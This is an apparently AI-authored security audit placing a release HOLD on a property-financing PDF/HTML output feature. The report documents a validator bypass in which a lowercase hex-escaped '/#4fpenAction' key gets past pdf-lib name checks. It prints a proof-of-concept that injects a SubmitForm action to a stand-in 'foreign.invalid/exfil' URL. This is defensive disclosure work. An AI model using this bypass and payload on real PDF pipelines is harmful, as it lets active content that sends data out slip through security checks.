# Financing output repair: Security HOLD

Date: 2026-10-14. Auditor: independent security-guardian. Branch: codex/property-marketing-release. Base: 39a971aed6f10e690af3305f3d7a0c61d6babfba. Scope: thirteen frozen output, dependency and cleanup files below. Governing CTR-004 revision 1: 59d0b203159f5c6c440621437bcd244f664f7a64901924b9a8b952a6a4d70dfa.

## Executive summary

HOLD: one new High PDF parser differential, H-FIN-OUTPUT-02. The repaired graph rejects the original H-FIN-OUTPUT-01 Next SubmitForm probe, including inline and indirect descendants, but it accepts a real PDF whose catalog contains a lowercase hexadecimal escaped OpenAction key. The installed pdf-lib parser does not normalize that valid spelling as the security policy expects. The parent acknowledged this engineering blocker and will assign the original author a minimal repair. This reviewer changed no production source.

The cleanup namespace grant remains narrowly source-qualified. This review does not establish current public serving, inquiry capture, actual rights, Chromium/R2 hosting or a full canonical PostgreSQL pass. Fresh Security and then fresh Quality must run after the next repair. Prior database Quality reports concern older packets; no current output Quality report was found. library/qa does not exist in this checkout.

The managed CVE watchlist last refreshed 2026-04-24 is beyond 120 days. Its intelligence needs a separate refresh. Current production dependency audit is clean; this does not turn the stale watchlist into complete current CVE coverage. Local Next.js instructions govern the imported Svelte examples.

## Scorecard

| Category | Status | Findings |
| --- | --- | --- |
| Financial and payment security | HOLD | Active-content validator bypass in financial document subset |
| PII exposure | OK within subset | None detected; no implemented inquiry HTTP flow qualified |
| Authentication and authorization | OK within subset | None detected in private immutable storage and owner binding |
| Injection and active content | HOLD | H-FIN-OUTPUT-02, High |
| Dependency security | OK for audit snapshot | Zero production advisories, existing Playwright version reused |
| Configuration and headers | OK within subset | Escaping, hash CSP, no-store and disabled script/network controls |
| Data handling and cleanup | OK for delta | Schema USAGE only; actual canonical PG rerun remains pending |

## Critical findings

None detected in the assigned subset. No production exploitation, action execution, financial disclosure or successful exfiltration was attempted or established.

## High findings

### H-FIN-OUTPUT-02: valid escaped PDF name bypasses action rejection

Status: OPEN, release-blocking. At apps/web/src/server/financing-release-pdf.ts:135-149, dictionary keys are compared using dictionary.has(PDFName.of(key)). Action contexts at lines 151-159 similarly depend on parser names. In installed node_modules/.pnpm/pdf-lib@1.17.1/node_modules/pdf-lib/cjs/core/objects/PDFName.js:10-11, decodeName uses /#([\dABCDEF]{2})/g, excluding lowercase hexadecimal a-f. PDFObjectParser.js:117-126 passes the raw name to PDFName.of. Thus the raw name /#4fpenAction is stored as a different name from /OpenAction, and the catalog's untyped action dictionary is missed.

The [Adobe PDF Reference 1.4, section 3.2.4 and catalog table 3.16](https://opensource.adobe.com/dc-acrobat-sdk-docs/pdfstandards/pdfreference1.4.pdf) defines hexadecimal name escapes and catalog OpenAction behavior. This probe concerns admitted active structure; it does not assert that a viewer executed SubmitForm or that the hosted product accepts uploaded PDFs.

Independent actual-byte reproduction loads the frozen four-page Chromium text-only-report.pdf, adds a catalog placeholder action, saves without object streams, and substitutes an equal-length key. All cross-reference offsets remain unchanged by the substitution:

```typescript
pdf.catalog.set(PDFName.of('XXOpenAction'), pdf.context.obj({
  S: 'SubmitForm',
  F: { FS: 'URL', F: 'https://foreign.invalid/exfil' },
  Flags: 0,
}));
const saved = Buffer.from(await pdf.save({ useObjectStreams: false }));
const at = saved.indexOf(Buffer.from('/XXOpenAction'));
Buffer.from('/#4fpenAction').copy(saved, at);
await expect(inspectFinancingReleasePdf(saved)).rejects.toThrow();
```

Actual RED: the rejection assertion resolves with four pages, original financial/disclosure text, zero images and only the approved canonical URL. Mutation is in memory in the ignored scratch test. It adds no Type Action field, which is optional in an action dictionary; adding that field would make this particular traversal detect it independently. The original report file was never overwritten.

Severity High: the asserted inert PDF subset admits a catalog action under a standard escaped spelling. The repair must normalize or reject ambiguous name encodings before security comparisons across the entire supported parsed graph. Avoid indiscriminate raw-byte replacement through compressed/image/font streams. Fail closed on unsupported names or parser ambiguity, and keep ordinary structure names and canonical URI positives. Actual-byte lowercase, uppercase, mixed spelling and action-context regressions should accompany the minimal change. This reviewer stopped additional mutations after the parent's freeze instruction.

### H-FIN-OUTPUT-01 reassessment

The exact retained old probe now passes its rejection assertion. The graph at financing-release-pdf.ts:94-169 bounds inspected/pending objects to 200,000 and depth to 64, visits stream dictionaries, arrays, inline and indirect descendants, and allows only finite Type/S/URI action keys. The allowed-key check rejects Next, even canonical-only or empty chains. Its distinct action visited set avoids confusing an already traversed dictionary with already validated action authority. Ordinary structure S names remain supported. This targeted repair does not close H-FIN-OUTPUT-02.

## Medium findings

None detected in this assigned increment. Current public route headers, host eligibility, inquiry nonce/idempotency, capture/delivery/purge composition and hosted browser limits remain unfinished consumers. They are not claimed by this packet.

## Low findings

None detected. Stale Weapon intelligence is an audit limitation recorded above.

## Reviewed controls

- financing-release-html.ts:47-132 strictly parses and recomputes the saved financial projection, checks source/manifest/evidence hashes, exact canonical origin/publication, quoted APR and validity, owner binding, unrevoked authority and both public channels. It escapes text and attributes, excludes private evidence keys from the public presentation, and provides hash CSP/no-store headers at lines 268-283. Its immutable form needs a later server-owned per-visitor nonce and qualified collection handler. A meta CSP alone does not enforce frame-ancestors.
- financing-release-render.ts:86-145 uses two process-local browser slots, finite navigation/PDF timeouts, disabled JavaScript and exact request interception. Only the source canonical document and admitted normalized media are fulfilled. The font hash, image metadata/dimension/pixel constraints and actual DOM, PDF text and painted-image parity are retained. Unapproved network requests abort. Hosted Chromium availability remains unqualified.
- financing-release-pdf.ts:173-293 applies byte/page/object/decoded-stream limits and supported font/CMap checks. Exact canonical parity is independent of URI shape acceptance. Actual image paint ordering and pixel checks remain in the same unchanged latter portion. These do not close the name differential.
- financing-release-artifacts.ts:76-207 confines immutable private objects to exact source owner and derived artifact identity, verifies signed HTTPS account/path/method, denies redirect behavior in the default transport and validates bounded MIME/length/hash GET bytes. A required server media resolver must match exact admitted asset bytes. No public bucket copy or arbitrary caller-selected URL is present. Private storage does not authorize anonymous publication.
- supabase/migrations/20261014051000_financing_release.sql:566 adds only schema USAGE to scheduler_runtime. No CREATE, table access, private export or role membership was added. Integration test lines 847-868 assert these negatives. Existing finite cleanup functions and explicit security-definer search paths remain unchanged. Author wire evidence fixes cleanup 42501 after the latest-1,000 export assertions; no export performance or complete canonical PG success is inferred.

## Independent verification

| Check | Result |
| --- | --- |
| All thirteen current source/dependency pins | Match supplied frozen values |
| Author append-only handoff | eaeef632d66de03021e05705dfd89e561a5a06dd811a79e0b83623b8040f6e43; original 10,519-byte prefix hashes to 6a8db20d46bdc5e8761d37e3e8eacd0fa98937fe46ee0b67a39f7e0a3f7dd275 |
| Old unchanged Security probe/config | Hashes match 3820f3d53ff0d433509f633340f019627dc7936f42e6d05fd7ac1d14f2c5fc88 and 700e44fd6e82b92d9c0304cd19eb9a8ee864afcebe664178f4dbaec206a89910; 1 test passes |
| Three-file focused compatibility command | 72 tests pass, exit 0, 57.89 seconds |
| New independent actual-byte probe | 1 RED escaped OpenAction rejection; 1 PASS graph depth refusal and harmless indirect-cycle termination |
| Frozen originals manifest | 43 artifacts, zero hash/length mismatches; manifest 58df4b90c460e8c4e55bb597e3acd325ea0b2a6617eef3a8a9336f2db9375663 |
| pnpm audit --prod --json | Zero Critical/High/Moderate/Low/informational advisories, 153 dependencies |
| pnpm audit:secrets | Six source roots and public environment boundary pass |
| Bounded manual source pattern sweep | No exposed key, raw card, logging, eval, command injection, browser-storage or unsafe HTML sink detected; internal secret configuration schema is expected |
| git diff --check and dependency/cleanup diff | Pass; existing exact Playwright 1.63.0 importer and finite namespace grant only |
| Full canonical PostgreSQL rerun | Not independently run; failed CI remains failed pending rerun |

Commands: pnpm exec vitest run --project unit apps/web/src/server/financing-release-output.unit.test.ts apps/web/src/server/financing-release-output-storage.unit.test.ts tooling/tests/unit/financing-release-database.test.ts; pnpm exec vitest run --config tmp/output-security/vitest.config.ts; pnpm exec vitest run --config tmp/output-repair-security/vitest.config.ts.

New scratch probe SHA-256: 19e471b38b3a779fc734ff06e5614e68f510161c8371d8a7b4b7d574e3db51d9. Config: 8c6b43068cdc9b0b52ecc050e6c56e218b46fb497c50cbcc1cb2d0aa0335af24. The authoritative earlier HOLD d4285b44c201b6809ee9368027a3cb45872ab1158ab9598e9ee6334879e7e72b remains unchanged.

The broad bundled scan.ts writes outside reviewer ownership and traverses unrelated active files; it was read but not run unbounded. Bounded sweeps, actual dependency/secret audits, behavior probes and pin checks provide scoped deterministic evidence. Memory mount access was previously unavailable to the parent; no raw-mount workaround or client-data persistence was attempted. No whole-branch fresh Security claim is made.

## Framework snapshot

Locked Next.js 16.3.8, React/React DOM 19.3.0, Playwright 1.63.0, pdf-lib 1.17.1 and Sharp 0.35.5. These exceed the historical patch minima in the managed catalog. No complete latest-CVE or hosted-runtime clearance is inferred.

## Frozen source pins

| File | SHA-256 |
| --- | --- |
| apps/web/src/server/financing-release-render.ts | c78709c28bf7e10585d35dba7ad755771aaf6f63df66e261713f258bad39a279 |
| apps/web/src/server/financing-release-html.ts | b4a4621873723e9245cd3bcfcd77bf9fc4f4133edc1e35a7b1a2c910d0a406a3 |
| apps/web/src/server/financing-release-pdf.ts | 58f3506da4cdc308f8e9f03d1f89950f01bc136244e608aadaaac3723c3df689 |
| apps/web/src/server/financing-release-artifacts.ts | b26213adb171cb6b09c539a2a1bba806eff23230e23ccd4748cf98dbb8544aac |
| apps/web/src/server/financing-release-output-fixture.js | 201809eeb62ef78e0c081ea0c7df6de5c34cc368c428f48bba4edec8a6a53f63 |
| apps/web/src/server/financing-release-output-fixture.d.ts | ae38b940f65162b0350c8dad7adb64f689caa7c622a35d4efc86d7f7411214bd |
| apps/web/src/server/financing-release-output.unit.test.ts | e6f027291ca89ab8c4d5fd6e372e6ed18bdb4fac1bb64c8bf0e76ac9e65483e2 |
| apps/web/src/server/financing-release-output-storage.unit.test.ts | bfede711b4c57ac19e1ecc2a4a9721ef4de32ab3943fc91b8c55af1985c412a3 |
| apps/web/package.json | 3d009dd3f93dec0921036e5f1df9405a148a250e37904bf91517f9d0cc6a998b |
| pnpm-lock.yaml | eae2bc37f24180a04f24d414f93a13c25e1931d59e3d1bfafe816309a01db231 |
| supabase/migrations/20261014051000_financing_release.sql | 0b0bd282e4a12ef47ccc512d6ab63527210c93f80c1ef8282ad08ef81bb70104 |
| packages/db/test/financing-release-repository.integration.test.mjs | 0607a6a27aba8243cd760e062eb879ce45e3a5bc140126774062f9e79c53fec6 |
| tooling/tests/unit/financing-release-database.test.ts | 3f8aea02a0729509e6f71cc8a9741923486ffe1bf280dee37c8af5128b7313d8 |

## Reviewer changes and next steps

Only this report and ignored scratch proof/config were created. No source, original capture, baseline, migration, dependency, root ledger, frozen report, Git state, provider, customer communication or live service was modified by the reviewer. The parent changed its ledger independently during the review, outside this source packet.

Original author repairs H-FIN-OUTPUT-02, then fresh independent Security re-evaluates and fresh Quality follows. Current anonymous route/host eligibility, concrete admission/resolution, saved setup/review/publication flow, nonce/capture/delivery/purge composition, rights and hosted R2/Chromium remain parent-owned completion work. One-page flyer and HighLevel QR supplement remain unfinished. Repository health and PR review closeout remain orchestrator gates before commit/push. No merge, deployment or provider release is approved here.
